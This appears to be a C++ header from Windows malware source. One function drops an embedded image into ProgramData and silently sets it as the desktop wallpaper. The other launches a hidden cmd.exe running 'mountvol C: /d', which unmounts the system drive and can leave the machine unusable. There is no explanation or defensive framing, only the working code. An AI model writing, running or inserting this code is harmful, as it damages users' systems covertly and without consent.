#pragma once
#include <Windows.h>
#include <string>
#include "resource.h"

using namespace std;

void initial() {
	WCHAR* buffer = new WCHAR[260];
	const WCHAR name[] = L"programdata";
	DWORD desktop = GetEnvironmentVariable(name, buffer, 260);
	std::wstring fullpath1;
	fullpath1 += buffer;
	fullpath1 += L"\\img.jpg";
	LPCWSTR cont1 = fullpath1.c_str();
	HINSTANCE hInstance = NULL;
	HRSRC hResInfo = FindResource(hInstance, MAKEINTRESOURCE(IDR_JPG1), TEXT("jpg"));
	HGLOBAL hRes = LoadResource(hInstance, hResInfo);
	LPVOID memRes = LockResource(hRes);
	DWORD sizeRes = SizeofResource(hInstance, hResInfo);
	HANDLE hFile = CreateFile(cont1, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwWritten = 0;
	WriteFile(hFile, memRes, sizeRes, &dwWritten, NULL);
	CloseHandle(hFile);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)cont1, SPIF_UPDATEINIFILE);
}

void eject()
{
	DWORD exitCode = 0;
	SHELLEXECUTEINFO ejectC = { 0 };
	ejectC.cbSize = sizeof(SHELLEXECUTEINFO);
	ejectC.fMask = SEE_MASK_NOCLOSEPROCESS;
	ejectC.hwnd = NULL;
	ejectC.lpVerb = NULL;
	ejectC.lpFile = L"C:\\Windows\\System32\\cmd.exe";
	ejectC.lpParameters = L"/c mountvol C: /d";
	ejectC.lpDirectory = NULL;
	ejectC.nShow = SW_HIDE;
	ejectC.hInstApp = NULL;
	ShellExecuteEx(&ejectC);
}